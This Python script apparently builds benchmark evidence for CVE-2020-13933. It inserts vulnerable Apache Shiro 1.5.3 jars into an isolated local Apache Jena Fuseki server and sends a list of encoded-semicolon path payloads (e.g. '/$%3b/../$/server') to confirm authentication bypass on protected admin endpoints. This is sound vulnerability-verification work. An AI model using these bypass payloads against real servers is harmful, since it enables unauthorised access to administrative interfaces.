#!/usr/bin/env python3
import base64
import http.client
import json
import os
import shutil
import signal
import socket
import subprocess
import time
import zipfile
from pathlib import Path


ROOT = Path("/data/lhq/workspace")
OUT_ROOT = ROOT / "ljl-v1-downstream-insertions"
SAMPLE_ID = "CVE-2020-13933__apache_jena__fuseki_v1_shiro_real_entrypoint"
SOURCE_CASE = "apache-shiro/CVE-2020-13933"
SOURCE_V1 = ROOT / "ljl-patch-java30-projects/input/apache-shiro/CVE-2020-13933/v1"
FUSEKI_SOURCE = ROOT / "ljl-strict-redo/probes/jena-fuseki-shiro/apache-jena-fuseki-3.13.0"
M2 = ROOT / "ljl-patch-java30-projects/.m2-poc"
SHIRO_JARS = [
    M2 / "org/apache/shiro/shiro-core/1.5.3/shiro-core-1.5.3.jar",
    M2 / "org/apache/shiro/shiro-web/1.5.3/shiro-web-1.5.3.jar",
    M2 / "org/apache/shiro/shiro-lang/1.5.3/shiro-lang-1.5.3.jar",
    M2 / "org/apache/shiro/shiro-cache/1.5.3/shiro-cache-1.5.3.jar",
    M2 / "org/apache/shiro/shiro-crypto-hash/1.5.3/shiro-crypto-hash-1.5.3.jar",
    M2 / "org/apache/shiro/shiro-crypto-core/1.5.3/shiro-crypto-core-1.5.3.jar",
    M2 / "org/apache/shiro/shiro-crypto-cipher/1.5.3/shiro-crypto-cipher-1.5.3.jar",
    M2 / "org/apache/shiro/shiro-config-core/1.5.3/shiro-config-core-1.5.3.jar",
    M2 / "org/apache/shiro/shiro-config-ogdl/1.5.3/shiro-config-ogdl-1.5.3.jar",
    M2 / "org/apache/shiro/shiro-event/1.5.3/shiro-event-1.5.3.jar",
]
V1_RUNTIME_JARS = SHIRO_JARS + [
    M2 / "commons-beanutils/commons-beanutils/1.9.4/commons-beanutils-1.9.4.jar",
    M2 / "commons-collections/commons-collections/3.2.2/commons-collections-3.2.2.jar",
    M2 / "org/owasp/encoder/encoder/1.2.2/encoder-1.2.2.jar",
]


def run(cmd, cwd=None, log=None, check=True):
    proc = subprocess.run(
        [str(x) for x in cmd],
        cwd=str(cwd) if cwd else None,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )
    if log:
        with log.open("a", encoding="utf-8") as handle:
            handle.write("$ " + " ".join(str(x) for x in cmd) + "\n")
            handle.write(proc.stdout)
            handle.write(f"\n[exit] {proc.returncode}\n")
    if check and proc.returncode != 0:
        raise RuntimeError(f"command failed: {' '.join(str(x) for x in cmd)}\n{proc.stdout}")
    return proc


def free_port():
    sock = socket.socket()
    sock.bind(("127.0.0.1", 0))
    port = sock.getsockname()[1]
    sock.close()
    return port


def request(port, path, auth=False):
    headers = {"Host": f"127.0.0.1:{port}"}
    if auth:
        token = base64.b64encode(b"admin:pw").decode("ascii")
        headers["Authorization"] = f"Basic {token}"
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
    try:
        conn.request("GET", path, headers=headers)
        resp = conn.getresponse()
        body = resp.read(8192).decode("utf-8", "replace")
        return {
            "url": f"http://127.0.0.1:{port}{path}",
            "path": path,
            "auth": auth,
            "status": resp.status,
            "body_prefix": body[:500],
        }
    except Exception as exc:
        return {
            "url": f"http://127.0.0.1:{port}{path}",
            "path": path,
            "auth": auth,
            "status": None,
            "error": repr(exc),
            "body_prefix": "",
        }
    finally:
        conn.close()


def wait_ready(port, deadline):
    while time.time() < deadline:
        result = request(port, "/$/ping")
        if result.get("status") == 200:
            return result
        time.sleep(1)
    return request(port, "/$/ping")


def write_shiro_ini(path):
    path.write_text(
        """[main]
ssl.enabled = false
plainMatcher=org.apache.shiro.authc.credential.SimpleCredentialsMatcher
iniRealm.credentialsMatcher = $plainMatcher

[users]
admin=pw

[urls]
/$/status = anon
/$/ping = anon
/$/server = authcBasic,user[admin]
/$/datasets = authcBasic,user[admin]
/$/stats/** = authcBasic,user[admin]
/manage.html = authcBasic,user[admin]
/services.html = authcBasic,user[admin]
/dataset.html = authcBasic,user[admin]
/** = anon
""",
        encoding="utf-8",
    )


def payload_paths():
    return [
        "/$/server%3bmain",
        "/$/server%3Bmain",
        "/$/datasets%3bmain",
        "/$/datasets%3Bmain",
        "/$/stats%3bmain",
        "/$/stats%3Bmain",
        "/manage.html%3bmain",
        "/manage.html%3Bmain",
        "/services.html%3bmain",
        "/services.html%3Bmain",
        "/dataset.html%3bmain",
        "/dataset.html%3Bmain",
        "/$%3b/../$/server",
        "/$%3B/../$/server",
        "/$%3b/../$/datasets",
        "/$%3B/../$/datasets",
        "/manage.html%3b",
        "/manage.html%3B",
        "/services.html%3b",
        "/services.html%3B",
        "/dataset.html%3b",
        "/dataset.html%3B",
    ]


def jar_entries(jar_path, prefixes):
    with zipfile.ZipFile(jar_path) as zf:
        return [name for name in zf.namelist() if any(name.startswith(prefix) for prefix in prefixes)]


def pom_version(jar_path, pom_path):
    with zipfile.ZipFile(jar_path) as zf:
        text = zf.read(pom_path).decode("utf-8", "replace")
    for line in text.splitlines():
        if line.startswith("version="):
            return line.split("=", 1)[1]
    return None


def prepare_runtime(sample_dir, evidence_dir, run_log):
    run_dir = sample_dir / "runtime"
    if run_dir.exists():
        shutil.rmtree(run_dir)
    ignore = shutil.ignore_patterns("run-shiro-probe", "evidence")
    shutil.copytree(FUSEKI_SOURCE, run_dir, ignore=ignore)

    jar_path = run_dir / "fuseki-server.jar"
    original_shiro_entries = jar_entries(jar_path, ["org/apache/shiro/", "META-INF/maven/org.apache.shiro/"])
    original_v1_dep_entries = jar_entries(
        jar_path,
        [
            "org/apache/commons/beanutils/",
            "META-INF/maven/commons-beanutils/",
            "org/apache/commons/collections/",
            "META-INF/maven/commons-collections/",
        ],
    )
    (evidence_dir / "original-shiro-entries.txt").write_text(
        "\n".join(original_shiro_entries) + "\n", encoding="utf-8"
    )
    (evidence_dir / "original-v1-dependency-entries.txt").write_text(
        "\n".join(original_v1_dep_entries) + "\n", encoding="utf-8"
    )

    run(
        [
            "zip",
            "-q",
            "-d",
            jar_path,
            "org/apache/shiro/*",
            "META-INF/maven/org.apache.shiro/*",
            "org/apache/commons/beanutils/*",
            "META-INF/maven/commons-beanutils/*",
            "org/apache/commons/collections/*",
            "META-INF/maven/commons-collections/*",
        ],
        log=run_log,
        check=True,
    )
    remaining_shiro_entries = jar_entries(jar_path, ["org/apache/shiro/", "META-INF/maven/org.apache.shiro/"])
    remaining_v1_dep_entries = jar_entries(
        jar_path,
        [
            "org/apache/commons/beanutils/",
            "META-INF/maven/commons-beanutils/",
            "org/apache/commons/collections/",
            "META-INF/maven/commons-collections/",
        ],
    )
    (evidence_dir / "remaining-shiro-entries.txt").write_text(
        "\n".join(remaining_shiro_entries) + "\n", encoding="utf-8"
    )
    (evidence_dir / "remaining-v1-dependency-entries.txt").write_text(
        "\n".join(remaining_v1_dep_entries) + "\n", encoding="utf-8"
    )

    run_base = sample_dir / "fuseki-base"
    if run_base.exists():
        shutil.rmtree(run_base)
    extra = run_base / "extra"
    extra.mkdir(parents=True)
    write_shiro_ini(run_base / "shiro.ini")
    stale_webinf = run_dir / "WEB-INF" / "lib"
    if stale_webinf.exists():
        for jar in stale_webinf.glob("shiro-*.jar"):
            jar.unlink()

    for jar in V1_RUNTIME_JARS:
        if not jar.exists():
            raise RuntimeError(f"missing v1 runtime jar: {jar}")
        shutil.copy2(jar, extra / jar.name)

    inserted_versions = {}
    for jar in extra.glob("shiro-*.jar"):
        with zipfile.ZipFile(jar) as zf:
            props = [name for name in zf.namelist() if name.startswith("META-INF/maven/org.apache.shiro/") and name.endswith("/pom.properties")]
            if props:
                inserted_versions[jar.name] = pom_version(jar, props[0])

    return run_dir, run_base, {
        "source_case": SOURCE_CASE,
        "source_v1": str(SOURCE_V1),
        "original_fuseki_distribution": str(FUSEKI_SOURCE),
        "original_shiro_entry_count": len(original_shiro_entries),
        "remaining_shiro_entry_count_after_deletion": len(remaining_shiro_entries),
        "original_v1_dependency_entry_count": len(original_v1_dep_entries),
        "remaining_v1_dependency_entry_count_after_deletion": len(remaining_v1_dep_entries),
        "inserted_extra_jars": sorted(str(p.relative_to(run_base)) for p in extra.glob("*.jar")),
        "inserted_shiro_versions": inserted_versions,
        "removed_exploded_webinf_shiro_jars": True,
        "insertion_method": "isolated runtime copy: remove embedded org/apache/shiro classes plus stale commons-beanutils/commons-collections classes from Fuseki fat jar, then add v1 Shiro 1.5.3 runtime jars under FUSEKI_BASE/extra so the real fuseki-server entrypoint loads the generated vulnerable library version",
    }


def main():
    sample_dir = OUT_ROOT / "samples" / SAMPLE_ID
    evidence_dir = sample_dir / "evidence"
    evidence_dir.mkdir(parents=True, exist_ok=True)
    run_log = evidence_dir / "run.log"
    run_log.write_text("", encoding="utf-8")

    run_dir, run_base, dependency_evidence = prepare_runtime(sample_dir, evidence_dir, run_log)
    port = free_port()
    (evidence_dir / "port.txt").write_text(str(port) + "\n", encoding="utf-8")
    server_log = open(evidence_dir / "server.log", "w", encoding="utf-8")
    env = os.environ.copy()
    env["FUSEKI_BASE"] = str(run_base)
    env["JVM_ARGS"] = "-Xmx512m"
    proc = subprocess.Popen(
        [str(run_dir / "fuseki-server"), "--localhost", "--port", str(port), "--mem", "/ds"],
        cwd=str(run_dir),
        stdout=server_log,
        stderr=subprocess.STDOUT,
        env=env,
        text=True,
    )
    (evidence_dir / "server.pid").write_text(str(proc.pid) + "\n", encoding="utf-8")
    try:
        ready = wait_ready(port, time.time() + 60)
        baseline_paths = [
            "/$/server",
            "/$/datasets",
            "/$/stats",
            "/manage.html",
            "/services.html",
            "/dataset.html",
            "/$/status",
            "/$/ping",
        ]
        reference_paths = ["/manage.html", "/services.html", "/dataset.html", "/$/server", "/$/datasets"]
        baseline = [request(port, path) for path in baseline_paths]
        auth_reference = [request(port, path, auth=True) for path in reference_paths]
        payload_results = [request(port, path) for path in payload_paths()]
    finally:
        try:
            proc.terminate()
            proc.wait(timeout=10)
        except Exception:
            try:
                os.kill(proc.pid, signal.SIGKILL)
            except OSError:
                pass
        server_log.close()

    protected_targets = {
        "/manage.html": ["Apache Jena Fuseki"],
        "/services.html": ["Apache Jena Fuseki"],
        "/dataset.html": ["Apache Jena Fuseki"],
        "/$/server": ["version", "datasets"],
        "/$/datasets": ["ds.name", "datasets"],
    }
    protected_401_paths = {
        item["path"]
        for item in baseline
        if (item["path"] in protected_targets or item["path"] == "/$/stats") and item["status"] == 401
    }
    bypasses = [
        item
        for item in payload_results
        if item.get("status") == 200
        and any(
            protected in item["path"]
            and protected in protected_401_paths
            and all(token in item.get("body_prefix", "") for token in tokens)
            for protected, tokens in protected_targets.items()
        )
    ]
    confirmed = (
        ready.get("status") == 200
        and len(protected_401_paths) >= 3
        and len(bypasses) >= 1
        and dependency_evidence["remaining_shiro_entry_count_after_deletion"] == 0
        and dependency_evidence["inserted_shiro_versions"].get("shiro-core-1.5.3.jar") == "1.5.3"
        and dependency_evidence["inserted_shiro_versions"].get("shiro-web-1.5.3.jar") == "1.5.3"
    )
    result = {
        "sample_id": SAMPLE_ID,
        "status": "TP_CONFIRMED_REAL_DOWNSTREAM_ENTRYPOINT" if confirmed else "FAILED",
        "source_case": SOURCE_CASE,
        "source_v1_path": str(SOURCE_V1),
        "upstream_library": "apache-shiro",
        "cve": "CVE-2020-13933",
        "vulnerable_version": "1.5.3",
        "downstream_repo": "apache/jena",
        "downstream_application": "Apache Jena Fuseki 3.13.0",
        "downstream_entrypoint": "fuseki-server real HTTP management endpoints",
        "payload": "/$%3b/../$/server",
        "dependency_evidence": dependency_evidence,
        "dynamic_signal": {
            "ready": ready,
            "protected_baseline_401_count": len(protected_401_paths),
            "protected_baseline_401_paths": sorted(protected_401_paths),
            "confirmed_bypass_count": len(bypasses),
            "confirmed_bypasses": bypasses,
            "auth_reference": auth_reference,
            "payload_results": payload_results,
        },
        "not_cve_poc_local": True,
        "not_runner_only": True,
        "notes": "The verifier does not execute .cve_poc_local. It inserts the v1 Shiro 1.5.3 runtime into an isolated Fuseki distribution and sends HTTP requests to Fuseki's real management endpoints.",
    }

    (sample_dir / "manifest.json").write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    (evidence_dir / "probe.json").write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    (evidence_dir / "dependency-evidence.json").write_text(json.dumps(dependency_evidence, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    (evidence_dir / "run.rc").write_text(
        f"RUN_RC={0 if confirmed else 1}\n"
        f"protected_baseline_401_count={len(protected_401_paths)}\n"
        f"confirmed_bypass_count={len(bypasses)}\n"
        f"remaining_shiro_entry_count_after_deletion={dependency_evidence['remaining_shiro_entry_count_after_deletion']}\n",
        encoding="utf-8",
    )
    (sample_dir / "README.md").write_text(
        f"# {SAMPLE_ID}\n\n"
        "Run `python3 scripts/verify_jena_fuseki_v1_shiro.py` from `/data/lhq/workspace/ljl-v1-downstream-insertions`.\n"
        "This verifies the generated v1 Apache Shiro CVE-2020-13933 runtime inside a real Apache Jena Fuseki entrypoint.\n",
        encoding="utf-8",
    )
    print(json.dumps({k: result[k] for k in ["sample_id", "status", "source_case", "downstream_application", "payload"]}, indent=2))
    print(json.dumps(result["dynamic_signal"], indent=2, sort_keys=True)[:4000])
    raise SystemExit(0 if confirmed else 1)


if __name__ == "__main__":
    main()
